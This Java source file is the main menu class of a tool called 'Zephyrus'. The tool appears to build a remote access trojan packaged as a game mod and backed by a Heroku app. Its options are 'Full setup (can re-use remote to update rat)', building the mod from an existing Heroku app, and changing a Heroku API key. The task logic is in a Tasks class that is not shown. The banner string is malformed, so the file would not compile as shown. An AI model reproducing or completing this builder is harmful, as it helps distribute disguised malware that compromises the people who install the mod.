package studio.dreamys;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.util.Scanner;

public class Zephyrus {
    public static Scanner sc = new Scanner(System.in);

    public static void main(String[] args) {
        System.out.println("********                 **                                     
        //////**          ****** /**       **   **"                     
             **    ***** /**///**/**      //** **  ****** **   **  ******"
           **    **///**/**  /**/******   //***  //**//*/**  /** **//// 
           **    /*******/****** /**///**   /**    /** / /**  /**//***** 
          **     /**//// /**///  /**  /**   **     /**   /**  /** /////**
         ********//******/**     /**  /**  **     /***   //****** ****** 
        ////////  ////// //      //   //  //      ///     ////// //////   +
        "release 2.0         https://dsc.gg/cheatersgetbanned         catsandwich#0627\n");

        System.out.println("Choose a task...");
        System.out.println("0. Full setup (can re-use remote to update rat)");
        System.out.println("1. Build mod from existing heroku app");
        System.out.println("---Extra---");
        System.out.println("2. Change heroku api key");
        System.out.println("3. Setup Help");
        int task = sc.nextInt();
        switch (task) {
            case 0:
                Tasks.fullSetup();
                break;
            case 1:
                Tasks.modOnly();
                break;
            case 2:
                FileUtils.deleteQuietly(new File(Tasks.path + "\\herokuapikey.Zephyrus"));
                Tasks.getHerokuAPIKey();
                break;
            case 3:
                Tasks.setup();
                break;
            default:
                System.out.println("Invalid task");
        }
    }
}
